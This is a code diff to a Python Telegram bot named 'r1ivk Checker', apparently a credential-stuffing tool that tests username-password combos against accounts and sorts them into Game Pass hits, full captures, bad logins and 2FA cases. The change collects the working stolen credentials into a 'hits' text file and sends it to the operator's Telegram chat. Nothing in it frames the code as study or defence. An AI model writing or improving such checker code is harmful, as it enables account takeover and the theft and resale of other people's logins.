@@ -8,6 +8,7 @@ import threading
 import queue
 import time
 from datetime import datetime
+import io
 
 # Telegram Bot Token
 TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
@@ -321,6 +322,7 @@ def run_live_checker(chat_id, message_id, combos, check_mode, user_id):
     full_captures = 0
     two_fa = 0
     bad = 0
+    hits_list = []
     
     start_time = time.time()
     last_update_time = start_time
@@ -334,16 +336,10 @@ def run_live_checker(chat_id, message_id, combos, check_mode, user_id):
         
         if status == "GAME_PASS_HIT":
             gamepass += 1
-            try:
-                bot.send_message(chat_id, f"🎯 **GamePass Hit!**\n`{hit_data}`", parse_mode="Markdown")
-            except Exception:
-                pass
+            hits_list.append(hit_data)
         elif status == "FULL_CAPTURE_HIT":
             full_captures += 1
-            try:
-                bot.send_message(chat_id, f"🎯 **Full Capture Hit!**\n`{hit_data}`", parse_mode="Markdown")
-            except Exception:
-                pass
+            hits_list.append(hit_data)
         elif status == "BAD_CREDENTIALS":
             bad += 1
         elif status == "2FA_REQUIRED":
@@ -388,6 +384,16 @@ def run_live_checker(chat_id, message_id, combos, check_mode, user_id):
         bot.edit_message_text(completion_text, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
     except Exception:
         pass
+        
+    # Send the hits file if any hits were found
+    if hits_list:
+        file_content = "\n".join(hits_list)
+        file_bytes = io.BytesIO(file_content.encode('utf-8'))
+        file_bytes.name = "r1ivk_checker_hits.txt"
+        try:
+            bot.send_document(chat_id, file_bytes, caption="📁 **r1ivk Checker - Hits Result File**")
+        except Exception:
+            pass
 
 if __name__ == "__main__":
     print("r1ivk Checker Bot is running (English UI)...")
